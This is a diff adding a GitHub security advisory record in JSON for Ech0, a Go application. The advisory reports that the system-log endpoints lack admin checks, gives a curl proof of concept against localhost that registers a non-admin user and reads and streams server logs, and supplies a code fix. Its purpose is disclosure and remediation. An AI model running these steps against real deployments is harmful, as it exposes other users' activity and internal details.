@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-w8jj-cwmc-wgq2",
+  "modified": "2026-04-10T20:03:59.175164Z",
+  "published": "2026-04-10T19:49:33Z",
+  "summary": "Ech0's Missing Authorization on System Logs Allows Non-Admin Information Disclosure",
+  "details": "## Summary\n\nThe system log endpoints (`GET /api/system/logs`, `GET /api/system/logs/stream`, `WS /ws/system/logs`) lack authorization checks, allowing any authenticated non-admin user to read and stream all server logs. These logs contain error stack traces, internal file paths, module names, and arbitrary structured fields that facilitate reconnaissance for further attacks.\n\n## Details\n\nThe dashboard routes in `internal/router/dashboard.go:7-8` register log endpoints on the `AuthRouterGroup` without any `RequireScopes` middleware:\n\n```go\n// internal/router/dashboard.go\nfunc setupDashboardRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {\n\tappRouterGroup.AuthRouterGroup.GET(\"/system/logs\", h.DashboardHandler.GetSystemLogs())\n\tappRouterGroup.AuthRouterGroup.GET(\"/system/logs/stream\", h.DashboardHandler.SSESubscribeSystemLogs())\n\tappRouterGroup.WSRouterGroup.GET(\"/system/logs\", h.DashboardHandler.WSSubscribeSystemLogs())\n}\n```\n\nCompare with other admin-only routes that properly use `RequireScopes`:\n\n```go\n// internal/router/setting.go — every route has RequireScopes\nappRouterGroup.AuthRouterGroup.GET(\"/settings\",\n    middleware.RequireScopes(authModel.ScopeAdminSettings),\n    h.SettingHandler.GetSiteSettings())\n```\n\nThe `AuthRouterGroup` only applies `JWTAuthMiddleware()` (router.go:36), which validates the JWT and sets the viewer context but does **not** check admin status. The `WSRouterGroup` (router.go:37) has no middleware at all — the WebSocket handler only calls `ParseToken` to verify the JWT signature (dashboard.go:74) without any role/scope validation.\n\nThe handler (`internal/handler/dashboard/dashboard.go:29-62`) and service (`internal/service/dashboard/dashboard.go:21-27`) contain zero authorization checks. Other services in the codebase properly enforce admin access:\n- `internal/service/inbox/inbox.go:132` — `ensureAdmin()`\n- `internal/service/migrator/migrator.go:360` — `ensureAdmin()`\n- `internal/service/comment/comment.go:719` — `requireAdmin()`\n\nNon-admin users are created with `IsAdmin: false` and `IsOwner: false` (`internal/service/user/user.go:220-221`) via the public registration endpoint.\n\nThe `LogEntry` struct (`internal/util/log/log.go:78-87`) exposes:\n```go\ntype LogEntry struct {\n    Time   string         `json:\"time\"`\n    Level  string         `json:\"level\"`\n    Msg    string         `json:\"msg\"`\n    Module string         `json:\"module,omitempty\"`\n    Caller string         `json:\"caller,omitempty\"`   // internal file paths\n    Error  string         `json:\"error,omitempty\"`     // error stack traces\n    Fields map[string]any `json:\"fields,omitempty\"`    // arbitrary structured data\n    Raw    string         `json:\"raw,omitempty\"`       // raw log lines\n}\n```\n\n## PoC\n\n```bash\n# 1. Register a non-admin user (system allows up to 5 users by default)\ncurl -X POST http://localhost:8080/api/register \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"attacker\",\"password\":\"Password123\"}'\n\n# 2. Login to get session token\nTOKEN=$(curl -s -X POST http://localhost:8080/api/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"attacker\",\"password\":\"Password123\"}' | jq -r '.data.token')\n\n# 3. Read system logs — should require admin but doesn't\ncurl http://localhost:8080/api/system/logs \\\n  -H \"Authorization: Bearer $TOKEN\"\n# Returns: {\"code\":1,\"data\":[{\"time\":\"...\",\"level\":\"error\",\"msg\":\"...\",\"module\":\"...\",\"caller\":\"internal/service/user/user.go:145\",\"error\":\"...\",\"fields\":{...}},...]}\n\n# 4. Subscribe to real-time log stream via SSE\ncurl -N \"http://localhost:8080/api/system/logs/stream?token=$TOKEN\"\n\n# 5. Subscribe via WebSocket (WSRouterGroup has NO middleware)\n# wscat -c \"ws://localhost:8080/ws/system/logs?token=$TOKEN\"\n```\n\n## Impact\n\nAny registered non-admin user can:\n- **Read all historical system logs** including error traces that reveal internal code paths, database errors, and application state\n- **Stream real-time logs** via SSE or WebSocket to monitor all server activity as it happens\n- **Gather reconnaissance data** — caller fields expose internal file paths and line numbers, error fields expose stack traces and database query failures, module fields map the internal architecture\n- **Monitor other users' actions** — authentication failures, registration events, and admin operations appear in logs\n\nThis information disclosure lowers the bar for chaining further attacks by revealing the application's internal structure, error handling patterns, and operational state.\n\n## Recommended Fix\n\nAdd `RequireScopes` middleware with an admin scope to the dashboard routes:\n\n```go\n// internal/router/dashboard.go\nfunc setupDashboardRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {\n\tappRouterGroup.AuthRouterGroup.GET(\"/system/logs\",\n\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n\t\th.DashboardHandler.GetSystemLogs())\n\tappRouterGroup.AuthRouterGroup.GET(\"/system/logs/stream\",\n\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n\t\th.DashboardHandler.SSESubscribeSystemLogs())\n\tappRouterGroup.WSRouterGroup.GET(\"/system/logs\",\n\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n\t\th.DashboardHandler.WSSubscribeSystemLogs())\n}\n```\n\nAdditionally, the WebSocket handler should validate admin scope after parsing the token, since the `WSRouterGroup` lacks middleware:\n\n```go\n// internal/handler/dashboard/dashboard.go — WSSubscribeSystemLogs\nclaims, err := jwtUtil.ParseToken(token)\nif err != nil {\n    ctx.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{\"msg\": \"invalid token\"})\n    return\n}\n// Add admin check for WebSocket endpoint\nif claims.TokenType == authModel.TokenTypeAccess \u0026\u0026 !containsScope(claims.Scopes, authModel.ScopeAdminSettings) {\n    ctx.AbortWithStatusJSON(http.StatusForbidden, gin.H{\"msg\": \"admin access required\"})\n    return\n}\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/lin-snow/ech0",
+        "purl": "pkg:golang/github.com/lin-snow/ech0"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.4.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w8jj-cwmc-wgq2/GHSA-w8jj-cwmc-wgq2.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/lin-snow/Ech0/security/advisories/GHSA-w8jj-cwmc-wgq2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/lin-snow/Ech0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/lin-snow/Ech0/releases/tag/v4.4.3"
+    }
+  ]
+}
